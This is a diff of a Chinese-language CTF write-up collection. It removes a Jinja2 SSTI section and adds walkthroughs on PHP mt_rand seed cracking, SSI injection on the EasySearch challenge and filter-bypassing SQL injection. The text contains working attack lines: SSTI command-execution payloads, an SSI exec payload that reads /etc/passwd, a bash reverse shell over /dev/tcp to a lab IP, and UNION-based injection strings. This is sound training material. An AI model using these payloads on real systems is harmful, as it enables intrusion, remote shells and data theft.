@@ -222,84 +222,275 @@ CVE-2021-42013 是由 CVE-2021-41773 的不完整修复导致的漏洞，攻击�
 
 拿到 flag: `flag{d9fa9969-60cf-4727-aa85-d1142da75b2d}`
 
-## [BJDCTF 2nd]fake google
-
-### 审计
-
-仿谷歌界面:
-
-![34-1.png](34-1.png)
-
-查看源码, 这里有提示是 SSTI:
-
-![34-2.png](34-2.png)
-
-### SSTI 
-
-![34-3.png](34-3.png)
-
-![34-4.png](34-4.png)
-
-说明是 Jinja2 模板;
-
-接下来试两轮, 发现可用 payload:
-
-```python
-{{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
-```
-
-![34-5.png](34-5.png)
-
-最终 flag 就在 `/flag 里`
-
-```python
-{{self.__init__.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}
-```
-
-![34-6.png](34-6.png)
-
-找到 flag `flag{fc6270d5-ac5c-48f6-a473-732ceba5e6a7}`, 比较顺利。
-
-## [SUCTF 2018]Homework
+## [GWCTF 2019]枯燥的抽奖
 
 ### 代码审计
 
 ```php
-<?php 
-class calc{
-	function __construct__(){
-		calc();
-	}
-
-    # intval() 获取变量的整数值
-
-	function calc($args1,$method,$args2){
-		$args1=intval($args1);
-		$args2=intval($args2);
-		switch ($method) {
-			case 'a':
-				$method="+";
-				break;
-
-			case 'b':
-				$method="-";
-				break;
-
-			case 'c':
-				$method="*";
-				break;
-
-			case 'd':
-				$method="/";
-				break;
-			
-			default:
-				die("invalid input");
-		}
-		$Expression=$args1.$method.$args2;
-		eval("\$r=$Expression;");
-		die("Calculation results:".$r);
-	}
+ <?php
+#这不是抽奖程序的源代码！不许看！
+header("Content-Type: text/html;charset=utf-8");
+session_start();
+if(!isset($_SESSION['seed'])){
+$_SESSION['seed']=rand(0,999999999);
 }
+
+mt_srand($_SESSION['seed']);
+$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+$str='';
+$len1=20;
+for ( $i = 0; $i < $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+}
+$str_show = substr($str, 0, 10);
+echo "<p id='p1'>".$str_show."</p>";
+
+
+if(isset($_POST['num'])){
+    if($_POST['num']===$str){x
+        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
+    }
+    else{
+        echo "<p id=flag>没抽中哦，再试试吧</p>";
+    }
+}
+show_source("check.php"); 
+```
+
+这个 `mt_rand()` 函数, 官方手册的描述如下:
+
+> 很多老的 libc 的随机数发生器具有一些不确定和未知的特性而且很慢。`mt_rand()` 函数是旧的 `rand()` 的临时替代。该函数用了**梅森旋转**中已知的特性作为随机数发生器，它可以产生随机数值的平均速度比 libc 提供的 `rand()` 快四倍。
+
+> 对于给定的值, 其 `mt_rand()` 的值是可预测固定的。
+
+抓个包可以发现会话没有重置, 每次发送的 session 是不变的;
+
+> [PHP mt_rand安全杂谈及应用场景详解](https://www.freebuf.com/vuls/192012.html)
+
+### php mt_rand
+
+```python
+str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ' #加密用串
+str2 = 'Hd2wBLK9uE'  # 已知串
+length = len(str2)
+res=''
+for i in range(len(str2)):
+    for j in range(len(str1)):
+        if str2[i] == str1[j]:
+            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
+            break
+print(res)
+```
+
+得到: `43 43 0 61 3 3 0 61 28 28 0 61 22 22 0 61 37 37 0 61 47 47 0 61 46 46 0 61 35 35 0 61 20 20 0 61 40 40 0 61`
+
+接下来用这个工具: [PHP mt_seed](https://github.com/openwall/php_mt_seed)
+
+```bash
+time ./php_mt_seed 43 43 0 61 3 3 0 61 28 28 0 61 22 22 0 61 37 37 0 61 47 47 0 61 46 46 0 61 35 35 0 61 20 20 0 61 40 40 0 61
+```
+
+爆出 seed: `640613494`
+
+![35-1.png](35-1.png)
+
+代入源码里就能得到 flag:  `Hd2wBLK9uE3aQuCg5IHK`
+
+```php
+<?php
+mt_srand(640613494);  
+$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+$str='';
+$len1=20;
+for ( $i = 0; $i < $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+} 
+print($str);
+```
+
+![35-2.png](35-2.png)
+
+## [BJDCTF2020]EasySearch
+
+### 目录扫描
+
+打开是个登录界面, 尝试了一下多种姿势的 sql 注入, 都没成功, 源码也没东西, 只能用 dirsearch 扫个盘了,扫出 `index.php.swp` 文件;
+
+### 代码审计
+
+```php
+<?php
+	# 打开输出缓冲
+	ob_start();
+	function get_hash(){
+		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
+		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
+		$content = uniqid().$random;
+		return sha1($content); 
+	}
+    header("Content-Type: text/html;charset=utf-8");
+	***
+    if(isset($_POST['username']) and $_POST['username'] != '' )
+    {
+        # 管理员id : 6d0bc1
+		$admin = '6d0bc1';
+        if ( $admin == substr(md5($_POST['password']),0,6)) {
+            echo "<script>alert('[+] Welcome to manage system')</script>";
+            $file_shtml = "public/".get_hash().".shtml";
+            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
+            $text = '
+            ***
+            ***
+            <h1>Hello,'.$_POST['username'].'</h1>
+            ***
+			***';
+            fwrite($shtml,$text);
+            fclose($shtml);
+            ***
+			echo "[!] Header  error ...";
+        } else {
+            echo "<script>alert('[!] Failed')</script>";
+            
+    }else
+    {
+	***
+    }
+	***
 ?>
 ```
+
+### 爆破 md5
+
+接下来只需要撞一下 md5, 暴力枚举:
+
+```python
+#!/usr/bin/env python3
+import hashlib
+import itertools
+import string
+
+# 已知目标
+target = "6d0bc1"
+
+# 可选字符集
+charset = string.ascii_letters + string.digits  # a-zA-Z0-9
+
+max_len = 5  
+
+def md5_prefix(s):
+    return hashlib.md5(s.encode()).hexdigest()[:6]
+
+# 暴力枚举
+for length in range(1, max_len + 1):
+    for pwd_tuple in itertools.product(charset, repeat=length):
+        pwd = ''.join(pwd_tuple)
+        if md5_prefix(pwd) == target:
+            print(f"[+] Found password: {pwd}")
+            exit(0)
+
+print("[-] Not found")
+```
+
+撞出: [+] Found password: RhPd
+
+带着 `6d0bc1`:`RhPd` 即可登录成功。
+
+### SHTML
+
+接下来审计代码, 发现这个登录非常奇怪, 实际上 username 只是起到了在登录界面回显的作用, 完全不参与任何身份验证, 并且回显直接是以写入的方式写在了一个 shtml 上。
+
+> shtml 是使用 SSI (Server Side Include) 的html文件扩展名，SSI (Server Side Include), 是一种类似于ASP的基于服务器的网页制作技术。
+
+#### 常用指令
+
+- `<!--#exec cmd=”cat /etc/passwd”-->`: 显示密码文件
+- `<!--#exec cmd="dir"-->`: 显示当前目录的文件夹和文件
+- `<!--#echo var="REMOTE_ADDR"-->`: 打印变量, 一般打印一些全局变量
+
+#### shtml-shell
+
+一个可用的反弹 shell
+
+```html
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/10.88.15.142/4444 0>&1'" --> 
+```
+
+#### 利用
+
+卡了半天发现写入的 shtml 地址就在回显的包里(Url_Is_Here):
+
+![36-2.png](36-2.png)
+
+尝试 POST username=payload: 
+
+```html
+</h1><h1>1111</h1><!--#exec cmd="cat /etc/passwd"--><h1>
+```
+
+![36-3.png](36-3.png)
+
+接下来开启 ovpn 发出反弹 shell
+
+```html
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/10.88.15.142/4444 0>&1'" --> 
+```
+
+![36-4.png](36-4.png)
+
+根目录下找到一个 flag + 一串哈希的文件夹, 读出 flag: `flag{83f324c2-81ba-4a9d-97d2-a5d5d72a777d}`。
+
+![36-5.png](36-5.png)
+
+## [WUSTCTF2020] 颜值成绩查询
+
+### 题解
+
+查询界面是 GET 传参, 尝试 SQL 注入: 
+
+```
+?stunum=1 --+
+```
+
+![37-1.png](37-1.png)
+
+此处存在注入; 且 `1/**/or/**/1=1/**/--` 可行, 但 `1 or 1=1` 显示错误, 说明过滤了空格;
+
+用 `order by` 探测出回显字段为 3 段, 接下来尝试联合查询注入:
+
+```
+0/**/union/**/select/**/1,database(),3/**/--
+```
+
+回显 `not exist`, 结合前面的空格过滤之后不报错, 仅显示号码不存在, 猜测可能是直接删除, 双写 union, select 等关键字:
+
+```sql
+0/**/ununionion/**/select/**/1,2,database()/**/--
+```
+
+![37-2.png](37-2.png)
+
+表名:
+
+```sql
+-1/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema="ctf"--
+```
+  
+![37-3.png](37-3.png)
+
+列名:
+
+```sql
+-1/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name="flag"--
+```
+
+![37-4.png](37-4.png)
+
+字段值:
+
+```sql
+-1/**/ununionion/**/select/**/1,group_concat(flag),group_concat(value)/**/from/**/flag--
+```
+
+爆出 flag: `flag{5ec6f226-82cb-477e-b253-5a1c1946499c}`
+
+![37-5.png](37-5.png)
